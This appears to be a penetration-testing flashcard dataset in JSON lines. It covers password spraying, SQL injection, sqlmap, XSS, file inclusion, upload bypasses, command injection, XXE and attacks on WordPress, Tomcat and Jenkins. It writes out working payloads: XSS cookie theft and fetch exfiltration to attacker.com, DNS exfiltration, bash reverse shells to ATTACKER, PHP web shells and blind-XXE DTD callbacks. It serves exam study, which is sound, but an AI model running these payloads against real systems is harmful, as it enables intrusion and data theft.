{"module_id":15,"question":"What does cewl do and why is it useful for password attacks?","answer":"cewl (Custom Word List generator) spiders a website and extracts words from the page content. Since organisations use their own terminology in passwords (product names, company values, project names), cewl-generated wordlists frequently crack passwords that rockyou.txt misses. Flags: -d depth, -m min-length, -o output file.","tags":["cewl","wordlist","password-attacks"]},
{"module_id":15,"question":"What tool generates personalised wordlists from OSINT data (name, birthdate, pet name)?","answer":"CUPP (Common User Password Profiler). Run: cupp -i for interactive mode. Enter name, birthdate, partner's name, pet name, keywords, and the target company. CUPP generates permutations with years, leet-speak, and special characters appended — highly effective for targeted attacks.","tags":["cupp","wordlist","osint"]},
{"module_id":15,"question":"Why is brute-forcing AD accounts dangerous and what is the safe alternative?","answer":"AD lockout triggers after typically 3-5 wrong attempts per account. Brute-force exceeds this quickly, locking out accounts and alerting the SOC. Safe alternative: password spraying — one password across ALL accounts, then wait the full observation window before the next spray. This keeps each account at 1 attempt.","tags":["brute-force","password-spraying","active-directory"]},
{"module_id":15,"question":"What WordPress brute-force method bypasses standard login lockout?","answer":"Authenticated XML-RPC brute-force via the xmlrpc.php endpoint. Unlike /wp-login.php which implements lockout, xmlrpc.php has no rate limiting in default WordPress. wpscan --url http://target --password-attack xmlrpc uses this method.","tags":["wordpress","brute-force","xmlrpc"]},
{"module_id":15,"question":"What hydra flags set the number of threads and the wait time between attempts?","answer":"-t N sets thread count (default 16). -W seconds waits N seconds between each connection attempt. Use -t 4 -W 5 for stealthy attacks on rate-limited targets. For SSH specifically, -t 4 is recommended to avoid false failures from connection limits.","tags":["hydra","stealth","rate-limiting"]},
{"module_id":15,"question":"How do you handle CSRF tokens when brute-forcing web login forms?","answer":"CSRF tokens require a token to be fetched before each login attempt. Burp Macros (Project Options → Sessions → Macros) can extracte CSRF tokens from the login page and inject them per-request. Alternatively, use a custom Python script that fetches the page, extracts the token, then submits the form.","tags":["csrf","brute-force","burp-suite"]},
{"module_id":15,"question":"What is credential stuffing and how does it differ from brute-force?","answer":"Credential stuffing uses actual username:password pairs from data breaches (not random guesses). Tools: Sentry MBA, Snipr. Effective because people reuse passwords across sites. Brute-force tries many passwords for one username. Stuffing tries known-good credentials from other breaches — much higher success rate with far fewer attempts.","tags":["credential-stuffing","password-attacks","methodology"]},
{"module_id":15,"question":"What tool generates username format permutations from a person's name?","answer":"Username-Anarchy: username-anarchy 'John Smith' generates formats like jsmith, johns, johnsmith, j.smith, smith.john. Used when you have a name from LinkedIn/About page but need to guess the actual username format used by the organisation.","tags":["username-anarchy","enumeration","osint"]},
{"module_id":15,"question":"What are the most commonly successful first-spray passwords in enterprise environments?","answer":"Season+Year (Spring2024!, Winter2024!), Company+Year (Acme2024!), Welcome1!, Password1!, P@ssw0rd, password123!. Also check: month+year (January2024), product names from the company website. Build from cewl output combined with year and special char suffixes.","tags":["password-spraying","methodology","passwords"]},

# Module 16 – SQL Injection
{"module_id":16,"question":"What is the information_schema in MySQL and what tables does it contain for SQLi?","answer":"information_schema is a virtual database present in all MySQL installations containing metadata. Key tables: information_schema.tables (all tables in all DBs), information_schema.columns (all columns in all tables), information_schema.schemata (all database names). These enable full DB structure enumeration via UNION injection.","tags":["sql-injection","mysql","information-schema"]},
{"module_id":16,"question":"What SQL comment sequences terminate the rest of a query?","answer":"-- (two dashes + space, MySQL/MSSQL/PostgreSQL), # (hash, MySQL only), /**/ (C-style comment, works in all DBs). URL encode: -- becomes --%20 (with encoded space), # becomes %23. In some contexts, --+ (dash dash plus) works when space is filtered.","tags":["sql-injection","comments","syntax"]},
{"module_id":16,"question":"What is the difference between error-based and blind SQL injection?","answer":"Error-based: database error messages contain extracted data (e.g., MySQL extractvalue() or updatexml() functions). Fast but requires error output in response. Blind: response changes (boolean) or timing (time-based) without data in response. Slower but works when errors are suppressed. Union-based requires data to appear in page output.","tags":["sql-injection","error-based","blind"]},
{"module_id":16,"question":"What SQL injection techniques bypass single-quote filtering?","answer":"Double quotes: SELECT * FROM users WHERE id=\"input\" — use double quotes if single quotes are filtered. Hex encoding: 'admin' = 0x61646d696e. Char function: CHAR(97,100,109,105,110). Unicode variations. Type juggling (integer injection — no quotes needed): WHERE id=1 OR 1=1.","tags":["sql-injection","filter-bypass","encoding"]},
{"module_id":16,"question":"What is second-order SQL injection?","answer":"User input is safely stored in the database (first request), but when retrieved and used in a subsequent SQL query (second request) without sanitisation, injection occurs. Example: username 'admin'-- is stored safely, but when used in a profile query: SELECT * FROM profiles WHERE username='admin'-- ' the comment breaks the query.","tags":["sql-injection","second-order","methodology"]},
{"module_id":16,"question":"What MySQL function concatenates data from multiple rows into a single string for UNION extraction?","answer":"GROUP_CONCAT() — groups all rows into a comma-separated string. Example: GROUP_CONCAT(table_name SEPARATOR ', '). Without it, UNION SELECT returns only one row at a time. Default max length is 1024 chars — increase with: GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ', ').","tags":["sql-injection","mysql","group-concat"]},
{"module_id":16,"question":"How do you test if a URL parameter is SQL injectable?","answer":"Add single quote: ?id=1' → if error or behavior change, likely injectable. Try: ?id=1 AND 1=1 (should behave normally) vs ?id=1 AND 1=2 (should behave differently). True/false condition difference confirms boolean-based injection. Always test in Burp Repeater for clean comparison.","tags":["sql-injection","detection","methodology"]},
{"module_id":16,"question":"What database-specific syntax reveals the current database name?","answer":"MySQL: SELECT database(). MSSQL: SELECT DB_NAME(). PostgreSQL: SELECT current_database(). Oracle: SELECT ora_database_name FROM dual. These are used in UNION injection: UNION SELECT 1,database(),3 --","tags":["sql-injection","database-fingerprint","syntax"]},
{"module_id":16,"question":"What privilege is required for MySQL LOAD_FILE() and INTO OUTFILE?","answer":"The FILE privilege — check with: SELECT super_priv FROM mysql.user WHERE user=user(); or SHOW GRANTS;. Even with FILE privilege, secure_file_priv must be empty ('') or set to the target directory. Check: SHOW VARIABLES LIKE 'secure_file_priv';","tags":["sql-injection","mysql","file-privilege"]},
{"module_id":16,"question":"What is stacked queries SQL injection?","answer":"Stacked queries (`;`) allow executing multiple SQL statements in one injection. Example: 1; DROP TABLE users;-- executes two statements. Supported by: MSSQL, PostgreSQL (by default). MySQL supports stacked queries via PDO but not older mysql_ functions. In MSSQL, stacking enables xp_cmdshell execution via injection.","tags":["sql-injection","stacked-queries","mssql"]},

# Module 17 – SQLMap
{"module_id":17,"question":"What sqlmap flag runs the tool non-interactively without user prompts?","answer":"--batch — automatically accepts all default answers to interactive questions. Essential for unattended runs. Combine with --flush-session to clear cached injection data when retesting, and --fresh-queries to ignore cached query results.","tags":["sqlmap","automation","flags"]},
{"module_id":17,"question":"How do you save a Burp request for use with sqlmap -r?","answer":"In Burp Repeater: right-click in the request panel → Save item → save as request.txt. Or in Proxy History: right-click request → Save item. The saved file contains all headers and body. Then: sqlmap -r request.txt --batch. This is the most reliable way to handle complex requests with cookies, tokens, and custom headers.","tags":["sqlmap","burp-suite","request-file"]},
{"module_id":17,"question":"What sqlmap flag attempts to get an interactive OS shell?","answer":"--os-shell — SQLMap deploys a backdoor for interactive command execution. On MySQL: writes PHP/ASP shell via INTO OUTFILE. On MSSQL: uses xp_cmdshell. Requires appropriate privileges (FILE privilege + web root write access, or SA-level MSSQL access).","tags":["sqlmap","os-shell","rce"]},
{"module_id":17,"question":"What is the purpose of sqlmap's --level and --risk flags?","answer":"--level (1-5): controls how many tests run per parameter. Higher = more tests but slower. Default=1. --risk (1-3): controls test aggressiveness. Risk 2 adds time-based queries; Risk 3 adds OR-based tests (may modify data — use carefully). Increase both when default level finds nothing: --level=3 --risk=2.","tags":["sqlmap","level","risk"]},
{"module_id":17,"question":"What sqlmap command dumps all non-system databases?","answer":"sqlmap -r request.txt --dump-all --exclude-sysdbs --batch. --dump-all extracts all databases. --exclude-sysdbs skips information_schema, mysql, performance_schema, and sys (system databases with no target-relevant data). Results are saved to ~/.sqlmap/output/[target]/ in CSV files.","tags":["sqlmap","dump","databases"]},
{"module_id":17,"question":"How do sqlmap tamper scripts help bypass WAFs?","answer":"Tamper scripts transform injection payloads before sending to evade WAF signatures. Applied with --tamper=scriptname. Common: space2comment (space → /**/), randomcase (random SQL keyword casing), between (> → NOT BETWEEN), charunicodeencode (unicode encoding). Chain: --tamper=space2comment,randomcase for additive effectiveness.","tags":["sqlmap","tamper","waf-bypass"]},
{"module_id":17,"question":"What sqlmap flag specifies which parameter to test when a request has many?","answer":"-p PARAMETER — e.g., -p id tests only the 'id' parameter. Without -p, sqlmap tests all parameters which is slower and noisier. Combine with --dbms=mysql (or mssql/postgresql) to further reduce testing scope and speed up detection.","tags":["sqlmap","parameter","efficiency"]},
{"module_id":17,"question":"Where does sqlmap save output and cracked hashes?","answer":"~/.sqlmap/output/[target-hostname]/ — contains separate files per database table dumped (CSV format), log files, and crack results. SQLMap automatically attempts to crack found password hashes using its built-in dictionary. Check the output directory after --dump for cracked passwords.","tags":["sqlmap","output","credentials"]},
{"module_id":17,"question":"What sqlmap flag reads a file from the server after confirming file read privilege?","answer":"--file-read='/path/to/file' — reads the specified file from the server filesystem via SQL injection (using LOAD_FILE for MySQL). Example: sqlmap -r req.txt --file-read='/etc/passwd' --batch. Output is saved to the sqlmap output directory.","tags":["sqlmap","file-read","privilege"]},
{"module_id":17,"question":"What is the sqlmap --technique flag and when do you use it?","answer":"--technique=TECH selects injection techniques: U=Union, E=Error, B=Boolean-blind, T=Time-blind, S=Stacked, Q=Inline. Use when you already know the injection type from manual testing to skip irrelevant tests. Example: --technique=U for confirmed UNION injection, --technique=BT for confirmed blind injection.","tags":["sqlmap","technique","optimization"]},

# Module 18 – XSS
{"module_id":18,"question":"What are the three types of XSS and which is highest impact?","answer":"Reflected: payload in request, reflected in response — requires victim to click crafted link. Stored: payload persists in database, executes for every viewer — highest impact. DOM: JavaScript reads attacker input and writes to DOM without server involvement. Stored XSS on admin-viewed pages is Critical impact.","tags":["xss","types","methodology"]},
{"module_id":18,"question":"What JavaScript snippet steals session cookies via XSS?","answer":"<script>document.location='http://attacker.com/steal?c='+document.cookie</script> or <script>new Image().src='http://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>. The Image approach is stealthier (no navigation change). Catch with nc -lvnp 80 or python HTTP server.","tags":["xss","cookie-theft","session-hijacking"]},
{"module_id":18,"question":"What does the HttpOnly cookie flag prevent and what XSS attacks still work?","answer":"HttpOnly prevents JavaScript (document.cookie) from reading the cookie — blocks cookie theft. Still possible: CSRF via XSS (read CSRF tokens from DOM, submit authenticated forms as victim), keylogging (capture keystrokes), credential capture (fake login form overlay), screenshot/recording of the DOM.","tags":["xss","httponly","cookie-flags"]},
{"module_id":18,"question":"What is a DOM-based XSS sink?","answer":"A DOM sink is a JavaScript function that writes attacker-controlled data to the DOM without sanitisation. Common sinks: innerHTML, document.write(), eval(), setTimeout(string), setInterval(string), location.href. Find by reading JS source for these functions accepting URL params or hash values.","tags":["xss","dom-based","sinks"]},
{"module_id":18,"question":"What XSS payload works when the reflection is inside an HTML attribute value?","answer":"Close the attribute and add an event handler: \" onmouseover=\"alert(1) or \" autofocus onfocus=\"alert(1). This closes the current attribute, adds a new one, and the closing > belongs to the existing tag. No angle brackets needed — bypasses filters that only block < and >.","tags":["xss","attribute-context","filter-bypass"]},
{"module_id":18,"question":"What is the XSS polyglot payload and why is it used?","answer":"A polyglot payload is crafted to work in multiple injection contexts (HTML, attribute, JavaScript, URL) simultaneously. Example: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert()). Used for quick detection across multiple contexts without knowing the exact reflection context in advance.","tags":["xss","polyglot","detection"]},
{"module_id":18,"question":"What is BeEF (Browser Exploitation Framework)?","answer":"BeEF hooks victim browsers that load a JavaScript hook script. Once hooked, attackers can: run commands in the victim browser, steal credentials, capture keystrokes, take screenshots, perform port scans of the local network, and launch social engineering attacks — all from the browser context. Useful for demonstrating XSS impact beyond alert(1).","tags":["xss","beef","post-exploitation"]},
{"module_id":18,"question":"How does XSS enable CSRF even when CSRF tokens are present?","answer":"XSS executes in the same origin as the vulnerable site — it can read CSRF tokens from the DOM (from a hidden input field or meta tag), construct and submit forms with valid tokens, and make authenticated API calls. The same-origin policy doesn't block XSS from reading CSRF tokens on the same domain.","tags":["xss","csrf","same-origin"]},
{"module_id":18,"question":"What is Content Security Policy (CSP) and does it prevent all XSS?","answer":"CSP is an HTTP response header that restricts which scripts can execute: Content-Security-Policy: script-src 'self'. It prevents inline scripts and external script loading. However: unsafe-inline, data: URIs, open redirects, and JSONP endpoints can bypass weak CSP policies. CSP is important but not a complete XSS defence.","tags":["xss","csp","defence"]},
{"module_id":18,"question":"What JavaScript method makes an authenticated background request from an XSS payload?","answer":"fetch() with credentials:'include' sends authenticated requests including cookies: fetch('/api/admin/users', {credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://attacker.com/?d='+btoa(d))). This exfiltrates API response data from the victim's authenticated session.","tags":["xss","fetch","same-origin"]},

# Module 19 – File Inclusion
{"module_id":19,"question":"What is the difference between LFI and RFI?","answer":"LFI (Local File Inclusion): includes files from the local server filesystem. Attacker reads /etc/passwd, config files, logs. RFI (Remote File Inclusion): includes files from an attacker-controlled URL. Requires allow_url_include=On in php.ini (disabled by default since PHP 5.2). RFI gives immediate RCE; LFI requires chaining techniques.","tags":["file-inclusion","lfi","rfi"]},
{"module_id":19,"question":"What PHP wrapper reads PHP source code without executing it?","answer":"php://filter/convert.base64-encode/resource=filename — the filter converts file content to base64 before returning, preventing PHP execution. Decode the base64 to read source. Works even with restrictive LFI — doesn't require filesystem traversal if the include mechanism accepts PHP stream wrappers.","tags":["lfi","php-wrappers","source-disclosure"]},
{"module_id":19,"question":"What files are targeted first during LFI exploitation?","answer":"/etc/passwd (user list), /etc/hosts (network info), web app config (config.php, .env, database.yml, settings.py), log files (/var/log/apache2/access.log for poisoning), SSH keys (/home/user/.ssh/id_rsa), /proc/self/environ (request headers). Windows: C:/Windows/System32/drivers/etc/hosts, web.config, applicationHost.config.","tags":["lfi","file-targets","methodology"]},
{"module_id":19,"question":"How does log poisoning convert LFI to RCE?","answer":"1. Confirm log file is readable via LFI. 2. Inject PHP code into a field that gets logged (User-Agent in access.log, username in auth.log/SSH fail). 3. Include the log file via LFI — PHP executes the injected code. 4. Control execution via a URL parameter passed to the included PHP code.","tags":["lfi","log-poisoning","rce"]},
{"module_id":19,"question":"What path traversal sequences bypass simple ../ filters?","answer":"....// (doubled slashes with dots), ..%2f (URL-encoded slash), ..%252f (double URL-encoded), %2e%2e%2f (fully URL-encoded), ..\\/ (backslash), ..%c0%af (Unicode overlong encoding). Null byte: ..%00 (PHP < 5.3) terminates the string, removing appended extensions like .php.","tags":["lfi","path-traversal","filter-bypass"]},
{"module_id":19,"question":"What php.ini settings must be enabled for RFI and the data:// wrapper?","answer":"allow_url_fopen=On (required for RFI and php://filter), allow_url_include=On (required for RFI and data:// wrappers). Both are Off by default in modern PHP. Check current settings via phpinfo() if accessible. LFI via path traversal works regardless of these settings.","tags":["rfi","php-config","wrappers"]},
{"module_id":19,"question":"What session file path does PHP default to for session storage?","answer":"/var/lib/php/sessions/sess_[PHPSESSID] where PHPSESSID is the cookie value. Also: /tmp/sess_[PHPSESSID] and /var/lib/php/session/ depending on session.save_path in php.ini. Session poisoning injects PHP code into a session variable, then includes the session file via LFI.","tags":["lfi","php-sessions","session-poisoning"]},
{"module_id":19,"question":"What is the data:// PHP wrapper and how is it used for LFI-to-RCE?","answer":"data://text/plain,<?php system('id'); ?> or data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg== injects PHP code directly as the included file content. Requires allow_url_include=On. If enabled, this is the simplest LFI-to-RCE: no log access needed, no log files to poison.","tags":["lfi","data-wrapper","rce"]},
{"module_id":19,"question":"What Windows files are useful to read via path traversal?","answer":"C:/Windows/System32/drivers/etc/hosts (network config), C:/Windows/win.ini (basic system info), C:/inetpub/wwwroot/web.config (IIS config, may contain credentials), C:/xampp/htdocs/config.php (XAMPP app config), C:/Users/user/Desktop/proof.txt (CPTS flag), C:/Windows/repair/sam (old SAM backup).","tags":["lfi","windows","file-targets"]},
{"module_id":19,"question":"How do you detect if a file inclusion parameter is vulnerable?","answer":"Test with a known readable file: ?page=../../../../etc/passwd → look for root:x:0:0 in response. Try absolute path: ?page=/etc/passwd. Test PHP wrappers: ?page=php://filter/convert.base64-encode/resource=index → response changes if wrappers work. A change in response (even error message) indicates inclusion attempt.","tags":["lfi","detection","methodology"]},

# Module 20 – File Upload
{"module_id":20,"question":"What are client-side upload restrictions and how are they bypassed?","answer":"Client-side restrictions use JavaScript to validate file type/extension before submission. They can be bypassed by: (1) disabling JavaScript in browser, (2) intercepting and modifying the upload request in Burp after the client-side check passes, (3) using curl to bypass browser entirely. Client-side validation is never a security control.","tags":["file-upload","client-side","bypass"]},
{"module_id":20,"question":"What file extensions can execute as PHP on Apache servers beyond .php?","answer":".php5, .phtml, .phar, .php3, .php4, .php7 — if mapped to the PHP handler in Apache config. In the .htaccess: AddHandler application/x-httpd-php .php5 enables these. Without explicit mapping, alternative extensions are served as text. Test empirically — access the file and check if PHP executes.","tags":["file-upload","php-extensions","apache"]},
{"module_id":20,"question":"What are magic bytes and how do they bypass content validation?","answer":"Magic bytes are the first bytes of a file that identify its type. GIF: GIF89a, JPEG: \\xFF\\xD8\\xFF, PNG: \\x89PNG. Validators checking only magic bytes (not the full content) can be bypassed by prepending valid magic bytes to a PHP shell. The server sees valid image type but PHP interprets and executes the code.","tags":["file-upload","magic-bytes","bypass"]},
{"module_id":20,"question":"What is a null byte injection in file upload and which PHP versions are affected?","answer":"Injecting %00 (null byte) after the malicious extension: shell.php%00.jpg. PHP versions < 5.3 treated null as string terminator — the filename becomes shell.php, ignoring .jpg. Fixed in PHP 5.3+. Still works in some C-based validation libraries that use null-terminated strings.","tags":["file-upload","null-byte","php-versions"]},
{"module_id":20,"question":"What SVG upload can achieve client-side XSS?","answer":"SVG files can contain embedded JavaScript: <svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>. If the application displays uploaded SVGs inline (not via Content-Disposition: attachment), this achieves stored XSS through the upload feature. Test when SVG upload is accepted.","tags":["file-upload","svg","xss"]},
{"module_id":20,"question":"What is the SSRF risk from server-side image processing on uploads?","answer":"Image processing libraries (ImageMagick, PIL) support various URL schemes when processing files. Crafted SVG or image files can trigger SSRF during processing: the server fetches attacker-controlled URLs while processing the uploaded file. ImageTragick (CVE-2016-3714) enables RCE via crafted MVG files processed by ImageMagick.","tags":["file-upload","ssrf","imagemagick"]},
{"module_id":20,"question":"What is a ZIP slip attack?","answer":"ZIP slip is a path traversal attack via archive extraction. A ZIP file containing entries with path traversal (../../shell.php) causes extraction to write files outside the intended directory. If the server extracts user-uploaded ZIPs, a malicious ZIP can place a web shell in the web root: zip malicious.zip ../../var/www/html/shell.php","tags":["file-upload","zip-slip","path-traversal"]},
{"module_id":20,"question":"What curl flags upload a file via multipart form with a specific Content-Type?","answer":"curl -F 'file=@shell.php;type=image/jpeg' http://target.com/upload. The -F flag creates multipart form data. @shell.php reads the local file. ;type=image/jpeg overrides the Content-Type for that part. Without the type override, curl sends the actual MIME type of the file.","tags":["file-upload","curl","multipart"]},
{"module_id":20,"question":"After uploading a web shell, what are the first commands to run?","answer":"id (confirm execution and user context), whoami, uname -a (Linux OS version), cat /etc/passwd (users), ls /home/ (home directories), cat /var/www/html/config.php (DB credentials), which python python3 perl (available interpreters for shell upgrade). Then establish a reverse shell for interactive access.","tags":["file-upload","web-shell","post-exploitation"]},

# Module 21 – Command Injection
{"module_id":21,"question":"What time-delay payload confirms blind command injection?","answer":"; sleep 5 (Linux) or & WAITFOR DELAY '0:0:5' (Windows). Inject and measure response time. If response takes 5+ seconds (normal response time + 5), command injection is confirmed regardless of whether any output appears. This works even when all output is suppressed.","tags":["command-injection","blind","time-delay"]},
{"module_id":21,"question":"What bash variable replaces spaces in command injection to bypass space filters?","answer":"$IFS (Internal Field Separator) — bash uses this as the field delimiter, defaulting to space/tab/newline. Example: cat$IFS/etc/passwd instead of cat /etc/passwd. Also: brace expansion {cat,/etc/passwd} and here-strings cat</etc/passwd avoid spaces entirely.","tags":["command-injection","filter-bypass","bash"]},
{"module_id":21,"question":"What are the five injection operators and when does each work?","answer":"; — always runs second command regardless of first's success. && — runs second only if first succeeds. || — runs second only if first fails. | — pipes first command output to second (second always runs). %0a — newline, same effect as semicolon in many contexts. Test all when one operator doesn't work.","tags":["command-injection","operators","syntax"]},
{"module_id":21,"question":"How do you extract command output when injection is blind and only DNS is outbound?","answer":"Encode command output into DNS queries: nslookup $(id).attacker.com or host $(whoami).attacker.com. The command substitution $(id) is URL-encoded/DNS-safe-encoded and appears as the subdomain in your DNS server's query logs. Requires a DNS server you control (attacker.com authoritative DNS).","tags":["command-injection","dns-exfiltration","blind"]},
{"module_id":21,"question":"What is the difference between OS command injection and code injection?","answer":"OS command injection passes input to system(), exec(), popen() or similar — the shell interprets the injected string as OS commands. Code injection injects into the application's own language (eval() in PHP/Python/JS) — executes as application code with all its capabilities. Both lead to RCE but via different vectors.","tags":["command-injection","code-injection","methodology"]},
{"module_id":21,"question":"What Windows cmd.exe equivalents exist for ; and && operators?","answer":"& (single ampersand) runs both commands regardless of first's result — equivalent to semicolon. && runs second only if first succeeds. || runs second only if first fails. Pipe | works same as Linux. CMD.exe does not use semicolons as separators — only the & and | operators.","tags":["command-injection","windows","operators"]},
{"module_id":21,"question":"What does double encoding achieve in command injection filter bypass?","answer":"Double URL encoding encodes the percent sign itself: %3b (;) → %253b (where %25 is URL-encoded %). If the application URL-decodes once (first pass: %253b → %3b), then passes to a URL decoder again, or to a function that decodes again, the semicolon emerges after the filter runs. Bypasses filter-then-decode implementations.","tags":["command-injection","double-encoding","filter-bypass"]},
{"module_id":21,"question":"How do you escalate from a web shell command injection to an interactive reverse shell?","answer":"Use the command injection to download and execute a reverse shell script: ; curl http://ATTACKER:8000/shell.sh -o /tmp/s.sh && bash /tmp/s.sh. Or inline: ; bash -i >& /dev/tcp/ATTACKER/4444 0>&1. Always URL-encode special characters if injecting via GET parameter.","tags":["command-injection","reverse-shell","escalation"]},
{"module_id":21,"question":"What is an unrestricted command injection and how does it differ from restricted?","answer":"Unrestricted: all characters allowed, any command works. Restricted: filters block specific characters (spaces, semicolons, special chars) requiring bypass techniques. Test restrictions by injecting individual characters: ; & | space $ ` — see which trigger errors/filtering. Then apply appropriate bypass for allowed characters only.","tags":["command-injection","restrictions","methodology"]},
{"module_id":21,"question":"What tool automates command injection detection in web applications?","answer":"Commix (Command Injection Exploiter): commix --url 'http://target.com/ping.php?ip=INJECT_HERE' --technique=T for time-based, --technique=R for results-based. Also: ffuf with sleep payloads for time-based detection. Burp Scanner pro detects command injection. Manual testing with sleep remains the most reliable initial detection method.","tags":["command-injection","commix","automated"]},

# Module 22 – Web Attacks
{"module_id":22,"question":"What is HTTP Verb Tampering and what misconfiguration enables it?","answer":"Changing the HTTP method (GET→POST→PUT→DELETE) to bypass access controls that only restrict specific methods. Enabled by: Apache Limit directives that restrict only GET/POST, IIS that allows all methods by default, or application frameworks that check method in middleware but not controllers. Test with OPTIONS first to see allowed methods.","tags":["http-verb-tampering","misconfiguration","access-control"]},
{"module_id":22,"question":"What is IDOR and what types of identifiers should be tested?","answer":"Insecure Direct Object Reference: accessing objects by manipulating user-controlled identifiers without proper authorisation checks. Test: numeric IDs (1001→1000), base64-encoded values (decode, modify, re-encode), UUID/GUID values (sequential or predictable), hash values (MD5/SHA1 of predictable values), and encoded JSON objects in parameters.","tags":["idor","access-control","web-attacks"]},
{"module_id":22,"question":"What is XXE injection and what vulnerable components enable it?","answer":"XML External Entity: DOCTYPE declarations reference external entities that the parser fetches. Enables: file read (SYSTEM 'file:///etc/passwd'), SSRF (SYSTEM 'http://internal-server/'), DoS (billion laughs). Vulnerable components: any XML parser processing DOCTYPE — SOAP services, XML imports/exports, file uploads (SVG, DOCX, XLSX, RSS), and JSON-to-XML conversion.","tags":["xxe","xml","ssrf"]},
{"module_id":22,"question":"How do you perform SSRF via XXE injection?","answer":"Use an HTTP URL in the SYSTEM identifier: <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\"> — this causes the server to fetch the AWS metadata endpoint and return the response in the XML parsing result. Used to access internal services not reachable externally: AWS metadata, internal APIs, admin interfaces on localhost.","tags":["xxe","ssrf","aws-metadata"]},
{"module_id":22,"question":"What encoding bypass enables IDOR testing on base64-encoded identifiers?","answer":"Decode with: echo 'BASE64' | base64 -d (Linux) or [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('BASE64')) (PowerShell). Modify the value. Re-encode: echo -n 'newvalue' | base64 (Linux) or [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('newvalue')). Replace in Burp Repeater.","tags":["idor","base64","encoding"]},
{"module_id":22,"question":"What is a blind XXE attack?","answer":"Blind XXE occurs when entity values aren't reflected in the response. Exploitation: use a parameter entity that fetches a remote DTD from your server: <!DOCTYPE r [<!ENTITY % remote SYSTEM 'http://attacker.com/xxe.dtd'>%remote;]>. The DTD contains further entity definitions that exfiltrate data via DNS/HTTP callbacks to your listener.","tags":["xxe","blind","out-of-band"]},
{"module_id":22,"question":"What HTTP method should always be tested for verb tampering bypass on admin endpoints?","answer":"OPTIONS first (to see what's allowed), then every method: GET, POST, PUT, DELETE, PATCH, HEAD, TRACE, CONNECT, and even arbitrary invalid methods (FAKEMETHOD). Some applications allow invalid methods that bypass access control entirely. HEAD requests are especially useful — they return headers without body, bypassing content-based authorisation.","tags":["http-verb-tampering","methods","api"]},
{"module_id":22,"question":"What is mass assignment and how does it relate to IDOR?","answer":"Mass assignment: web frameworks automatically bind all request parameters to object properties. If the API accepts {\"username\":\"user\"} but also processes {\"username\":\"user\",\"role\":\"admin\"}, adding the role parameter grants privilege escalation. Test by adding admin-related fields (role, isAdmin, admin, privilege) to any POST/PUT request.","tags":["mass-assignment","idor","api"]},
{"module_id":22,"question":"What IDOR vulnerability affects file download endpoints?","answer":"Download endpoints often use: /download?file=invoice_1001.pdf — change to invoice_1000.pdf for other users' files, or use path traversal: /download?file=../../../../etc/passwd. Also test: /api/files/[GUID] with enumerated GUIDs. Even 'secure' UUID-based identifiers may be discoverable from API responses or predictable UUIDs.","tags":["idor","file-download","path-traversal"]},
{"module_id":22,"question":"How is XXE triggered via file upload (DOCX/XLSX/SVG)?","answer":"DOCX/XLSX are ZIP archives containing XML files. Extract: unzip file.docx -d docx_dir. Edit word/document.xml to inject XXE DOCTYPE. Rezip and upload. SVG files directly accept XML with DOCTYPE. Any endpoint that processes uploaded office documents or SVG files may parse DOCTYPE and trigger XXE.","tags":["xxe","file-upload","docx"]},

# Module 23 – Attacking Common Apps
{"module_id":23,"question":"What is the primary method to gain RCE after achieving WordPress admin access?","answer":"Appearance → Theme Editor → select the active theme → edit 404.php → add: <?php system($_GET['cmd']); ?> → save. Access: http://target.com/wp-content/themes/[theme-name]/404.php?cmd=id. This is the most reliable WordPress admin-to-RCE path.","tags":["wordpress","rce","theme-editor"]},
{"module_id":23,"question":"What wpscan option performs aggressive plugin detection?","answer":"--plugins-detection aggressive — sends more targeted requests to detect plugins not listed in the main plugin directory. Helps find vulnerable or outdated plugins that passive scanning misses. Combine with --api-token to get CVE data for discovered plugins.","tags":["wpscan","wordpress","plugins"]},
{"module_id":23,"question":"What Apache Tomcat Manager endpoint accepts WAR file deployments?","answer":"/manager/text/deploy — text interface for deployment. /manager/html — GUI interface. Deploy via curl: curl -u tomcat:tomcat 'http://target:8080/manager/text/deploy?path=/shell' -T shell.war. Default credentials to try: tomcat:tomcat, tomcat:s3cr3t, admin:admin.","tags":["tomcat","war-upload","rce"]},
{"module_id":23,"question":"What Jenkins feature provides direct OS command execution without exploitation?","answer":"Manage Jenkins → Script Console — executes arbitrary Groovy code on the server. Code runs as the Jenkins service user. def cmd = 'id'.execute(); println cmd.text. This is a legitimate admin feature, not a vulnerability, but provides RCE if admin access is obtained.","tags":["jenkins","script-console","rce"]},
{"module_id":23,"question":"What tool scans Git repositories for secrets in commit history?","answer":"gitleaks: gitleaks detect -s /path/to/repo. truffleHog: truffleHog git /path/to/repo --only-verified. Both scan all commits including deleted content. Also: git log -p | grep -i 'password\\|secret\\|token\\|key\\|api' for manual scanning. Always check .git directories exposed via web servers.","tags":["git","secrets","gitleaks"]},
{"module_id":23,"question":"What WordPress XMLRPC endpoint can brute-force login without account lockout?","answer":"xmlrpc.php — accepts username/password combinations via system.multicall XML method. Unlike /wp-login.php, it has no lockout protection in default WordPress. wpscan --password-attack xmlrpc uses this. Test if xmlrpc is enabled: curl -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' http://target.com/xmlrpc.php","tags":["wordpress","xmlrpc","brute-force"]},
{"module_id":23,"question":"What is a WAR file and how does it achieve RCE on Tomcat?","answer":"WAR (Web Application Archive) is a ZIP-formatted packaging of Java web applications including JSP files. Tomcat's manager app deploys WAR files and makes JSP pages accessible via HTTP. When the JSP contains runtime.exec() or ProcessBuilder code, accessing the URL executes OS commands. msfvenom -f war generates ready-to-use shells.","tags":["tomcat","war","jsp"]},
{"module_id":23,"question":"What is the Drupalgeddon vulnerability and which Drupal versions are affected?","answer":"Drupalgeddon refers to multiple critical RCE vulnerabilities. Drupalgeddon2 (CVE-2018-7600, CVSS 9.8) affects Drupal 6-8, allowing unauthenticated RCE via a form API vulnerability. Searchsploit: searchsploit drupal 7 or drupal 8 for version-specific exploits. Always check Drupal version at /CHANGELOG.txt or /core/CHANGELOG.txt.","tags":["drupal","drupalgeddon","cve"]},
